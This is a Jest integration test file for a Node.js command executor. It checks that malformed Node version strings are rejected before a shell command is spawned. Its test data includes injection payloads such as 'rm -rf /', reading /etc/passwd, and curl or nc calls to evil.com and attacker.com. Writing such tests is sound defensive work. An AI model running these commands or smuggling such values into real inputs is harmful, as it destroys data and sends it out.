/**
 * CommandExecutor Security Integration Tests - Node Version Validation
 *
 * Integration tests verifying that validateNodeVersion() is properly integrated
 * into CommandExecutor.executeInternal() to prevent command injection attacks.
 *
 * SECURITY CONTEXT:
 * - Severity: HIGH (CWE-77: Command Injection)
 * - Attack Vector: Unvalidated nodeVersion parameter interpolated into shell command
 * - Vulnerable Line: commandExecutor.ts:101 - `fnm exec --using=${nodeVersion} ${command}`
 * - Protection: Validation MUST block injection BEFORE spawn() is called
 *
 * Target Coverage: 100% for security validation integration paths
 */

import { CommandExecutor } from '@/core/shell/commandExecutor';
import { CommandSequencer } from '@/core/shell/commandSequencer';
import { EnvironmentSetup } from '@/core/shell/environmentSetup';
import { FileWatcher } from '@/core/shell/fileWatcher';
import { PollingService } from '@/core/shell/pollingService';
import { ResourceLocker } from '@/core/shell/resourceLocker';
import { RetryStrategyManager } from '@/core/shell/retryStrategyManager';
import type { ExecuteOptions } from '@/core/shell/types';
import { spawn } from 'child_process';
import type { ChildProcess } from 'child_process';
import { EventEmitter } from 'events';

// Mock all dependencies
jest.mock('child_process');
jest.mock('@/core/logging/debugLogger', () => ({
    getLogger: () => ({
        error: jest.fn(),
        debug: jest.fn(),
        info: jest.fn(),
        warn: jest.fn()
    })
}));

jest.mock('@/core/shell/commandSequencer');
jest.mock('@/core/shell/environmentSetup');
jest.mock('@/core/shell/fileWatcher');
jest.mock('@/core/shell/pollingService');
jest.mock('@/core/shell/resourceLocker');
jest.mock('@/core/shell/retryStrategyManager');

describe('CommandExecutor - Security: Node Version Validation Integration', () => {
    let commandExecutor: CommandExecutor;
    let mockEnvironmentSetup: jest.Mocked<EnvironmentSetup>;
    let spawnMock: jest.Mock;

    beforeEach(() => {
        jest.clearAllMocks();

        // Setup mock implementations BEFORE creating CommandExecutor
        (ResourceLocker as jest.MockedClass<typeof ResourceLocker>).mockImplementation(() => ({
            executeExclusive: jest.fn(<T>(resource: string, operation: () => Promise<T>) => operation()) as any,
            clearAllLocks: jest.fn()
        } as any));

        (RetryStrategyManager as jest.MockedClass<typeof RetryStrategyManager>).mockImplementation(() => ({
            executeWithRetry: jest.fn((executeFn: () => Promise<any>) => executeFn()) as any,
            getDefaultStrategy: jest.fn(() => ({
                maxAttempts: 1,
                initialDelay: 1000,
                maxDelay: 5000,
                backoffFactor: 2
            })),
            getStrategy: jest.fn((_name: string) => ({
                maxAttempts: 1,
                initialDelay: 1000,
                maxDelay: 5000,
                backoffFactor: 1.5
            }))
        } as any));

        (EnvironmentSetup as jest.MockedClass<typeof EnvironmentSetup>).mockImplementation(() => {
            const mock = {
                findAdobeCLINodeVersion: jest.fn().mockResolvedValue('18'),
                findFnmPath: jest.fn().mockReturnValue('/usr/local/bin/fnm'),
                findNpmGlobalPaths: jest.fn().mockReturnValue([]),
                ensureAdobeCLIConfigured: jest.fn().mockResolvedValue(undefined),
                ensureAdobeCLINodeVersion: jest.fn().mockResolvedValue(undefined),
                resetSession: jest.fn()
            } as any;
            mockEnvironmentSetup = mock;
            return mock;
        });

        (FileWatcher as jest.MockedClass<typeof FileWatcher>).mockImplementation(() => ({
            disposeAll: jest.fn(),
            waitForFileSystem: jest.fn()
        } as any));

        (CommandSequencer as jest.MockedClass<typeof CommandSequencer>).mockImplementation(() => ({
            executeSequence: jest.fn(),
            executeParallel: jest.fn()
        } as any));

        (PollingService as jest.MockedClass<typeof PollingService>).mockImplementation(() => ({
            pollUntilCondition: jest.fn()
        } as any));

        // Create mock for spawn
        spawnMock = spawn as jest.Mock;

        // Create CommandExecutor instance
        commandExecutor = new CommandExecutor();
    });

    // =================================================================
    // SECURITY TESTS - Injection Attack Prevention
    // =================================================================

    describe('security: command injection prevention', () => {
        it('should block semicolon injection BEFORE spawn() is called', async () => {
            // Given: Malicious nodeVersion with semicolon injection
            const maliciousVersion = '20; rm -rf /';
            const options: ExecuteOptions = { useNodeVersion: maliciousVersion };

            // When: Attempting to execute command
            const promise = commandExecutor.execute('npm install', options);

            // Then: Validation throws error BEFORE spawn() is called
            await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
            expect(spawnMock).not.toHaveBeenCalled();
        });

        it('should block ampersand AND injection BEFORE spawn() is called', async () => {
            // Given: Malicious nodeVersion with && injection
            const maliciousVersion = '20 && cat /etc/passwd';
            const options: ExecuteOptions = { useNodeVersion: maliciousVersion };

            // When: Attempting to execute command
            const promise = commandExecutor.execute('npm install', options);

            // Then: Validation throws error BEFORE spawn() is called
            await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
            expect(spawnMock).not.toHaveBeenCalled();
        });

        it('should block ampersand background injection BEFORE spawn() is called', async () => {
            // Given: Malicious nodeVersion with & background execution
            const maliciousVersion = '20 & curl evil.com';
            const options: ExecuteOptions = { useNodeVersion: maliciousVersion };

            // When: Attempting to execute command
            const promise = commandExecutor.execute('npm install', options);

            // Then: Validation throws error BEFORE spawn() is called
            await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
            expect(spawnMock).not.toHaveBeenCalled();
        });

        it('should block pipe injection BEFORE spawn() is called', async () => {
            // Given: Malicious nodeVersion with pipe injection
            const maliciousVersion = '20 | nc attacker.com 1234';
            const options: ExecuteOptions = { useNodeVersion: maliciousVersion };

            // When: Attempting to execute command
            const promise = commandExecutor.execute('npm install', options);

            // Then: Validation throws error BEFORE spawn() is called
            await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
            expect(spawnMock).not.toHaveBeenCalled();
        });

        it('should block ALL 9 injection payloads comprehensively', async () => {
            // Given: Comprehensive injection payload array from security test suite
            const injectionPayloads = [
                '20; rm -rf /',                    // Semicolon command separator
                '20 && cat /etc/passwd',           // AND operator
                '20 & curl evil.com',              // Background execution
                '20 | nc attacker.com 1234',       // Pipe to network command
                '20 || echo hacked',               // OR operator
                '20 > /tmp/malicious.txt',         // Output redirection
                '20 < /etc/passwd',                // Input redirection
                '20 `curl evil.com`',              // Command substitution (backticks)
                '20 $(curl evil.com)'              // Command substitution (subshell)
            ];

            // When/Then: Each payload is blocked BEFORE spawn() is called
            for (const payload of injectionPayloads) {
                jest.clearAllMocks();

                const options: ExecuteOptions = { useNodeVersion: payload };
                const promise = commandExecutor.execute('npm install', options);

                await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
                expect(spawnMock).not.toHaveBeenCalled();
            }
        });
    });

    // =================================================================
    // HAPPY PATH TESTS - Valid Formats Pass Through
    // =================================================================

    describe('happy path: valid node version formats', () => {
        it('should accept valid numeric version and call spawn()', async () => {
            // Given: Valid numeric version
            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: '20' };

            // When: Executing command with valid version
            const promise = commandExecutor.execute('npm install', options);

            // Simulate successful execution
            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: Command executes successfully
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
        });

        it('should accept all known numeric versions', async () => {
            // Given: All known numeric Node.js versions
            const validVersions = ['18', '20', '22', '24'];

            // When/Then: Each version executes successfully
            for (const version of validVersions) {
                jest.clearAllMocks();

                const mockChild = createMockChildProcess();
                spawnMock.mockReturnValue(mockChild);

                const options: ExecuteOptions = { useNodeVersion: version };
                const promise = commandExecutor.execute('npm install', options);

                process.nextTick(() => {
                    mockChild.stdout!.emit('data', Buffer.from('success\n'));
                    mockChild.emit('close', 0);
                });

                const result = await promise;
                expect(result.code).toBe(0);
                expect(spawnMock).toHaveBeenCalled();
            }
        });

        it('should accept valid semantic version and call spawn()', async () => {
            // Given: Valid semantic version
            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: '20.11.0' };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: Command executes successfully
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
        });

        it('should accept "auto" keyword, resolve version, and validate resolved version', async () => {
            // Given: "auto" keyword (user input is valid)
            mockEnvironmentSetup.findAdobeCLINodeVersion.mockResolvedValue('18');

            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: 'auto' };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: Command executes successfully (resolved version also validated)
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
            expect(mockEnvironmentSetup.findAdobeCLINodeVersion).toHaveBeenCalled();
        });

        it('should accept "current" keyword and call spawn()', async () => {
            // Given: "current" keyword
            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: 'current' };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: Command executes successfully (uses fnm env, not interpolated)
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
        });

        it('should skip validation for null and call spawn()', async () => {
            // Given: null (no nodeVersion specified)
            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: null };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: Command executes successfully (null skips validation)
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
        });

        it('should skip validation for undefined (no useNodeVersion option)', async () => {
            // Given: undefined (useNodeVersion not in options)
            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = {}; // useNodeVersion is undefined

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: Command executes successfully (undefined skips validation)
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
        });
    });

    // =================================================================
    // DEFENSE-IN-DEPTH TESTS - Resolved Version Validation
    // =================================================================

    describe('defense-in-depth: resolved version validation', () => {
        it('should validate resolved version from findAdobeCLINodeVersion()', async () => {
            // Given: "auto" resolves to a valid version
            mockEnvironmentSetup.findAdobeCLINodeVersion.mockResolvedValue('20');

            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: 'auto' };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: Resolved version is validated and command succeeds
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
        });

        it('should block malicious resolved version from findAdobeCLINodeVersion()', async () => {
            // Given: "auto" resolves to a malicious version (defense-in-depth scenario)
            mockEnvironmentSetup.findAdobeCLINodeVersion.mockResolvedValue('20; rm -rf /');

            const options: ExecuteOptions = { useNodeVersion: 'auto' };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            // Then: Resolved malicious version is blocked BEFORE spawn()
            await expect(promise).rejects.toThrow(/invalid Node.js version format/i);
            expect(spawnMock).not.toHaveBeenCalled();
        });

        it('should skip validation for "current" keyword (not interpolated)', async () => {
            // Given: "current" keyword (uses fnm env, not interpolated into --using=)
            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: 'current' };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            // Then: "current" is not validated (safe because not interpolated)
            const result = await promise;
            expect(result.code).toBe(0);
            expect(spawnMock).toHaveBeenCalled();
        });
    });

    // =================================================================
    // SPAWN BEHAVIOR VERIFICATION
    // =================================================================

    describe('spawn() call verification', () => {
        it('should NEVER call spawn() when validation fails', async () => {
            // Given: Multiple invalid versions
            const invalidVersions = [
                '20; rm -rf /',
                '20 && cat /etc/passwd',
                'v20',
                '20.11',
                ''
            ];

            // When/Then: spawn() is never called for any invalid version
            for (const version of invalidVersions) {
                jest.clearAllMocks();

                const options: ExecuteOptions = { useNodeVersion: version };
                const promise = commandExecutor.execute('npm install', options);

                await expect(promise).rejects.toThrow();
                expect(spawnMock).not.toHaveBeenCalled();
            }
        });

        it('should call spawn() with validated version in command', async () => {
            // Given: Valid version
            const mockChild = createMockChildProcess();
            spawnMock.mockReturnValue(mockChild);

            const options: ExecuteOptions = { useNodeVersion: '20' };

            // When: Executing command
            const promise = commandExecutor.execute('npm install', options);

            process.nextTick(() => {
                mockChild.stdout!.emit('data', Buffer.from('success\n'));
                mockChild.emit('close', 0);
            });

            await promise;

            // Then: spawn() was called with validated version interpolated safely
            expect(spawnMock).toHaveBeenCalled();

            // Verify spawn was called with command containing validated version
            const spawnCall = spawnMock.mock.calls[0];
            const command = spawnCall[0];
            expect(command).toContain('fnm exec --using=20');
            expect(command).toContain('npm install');
        });
    });
});

// =================================================================
// TEST HELPERS
// =================================================================

/**
 * Helper to create mock ChildProcess for testing
 */
function createMockChildProcess(): ChildProcess {
    const mockChild = new EventEmitter() as any;
    mockChild.stdout = new EventEmitter();
    mockChild.stderr = new EventEmitter();
    mockChild.stdin = { write: jest.fn(), end: jest.fn() };
    mockChild.pid = 12345;
    Object.defineProperty(mockChild, 'killed', { value: false, writable: true });
    Object.defineProperty(mockChild, 'exitCode', { value: null, writable: true });
    mockChild.kill = jest.fn();
    return mockChild as ChildProcess;
}
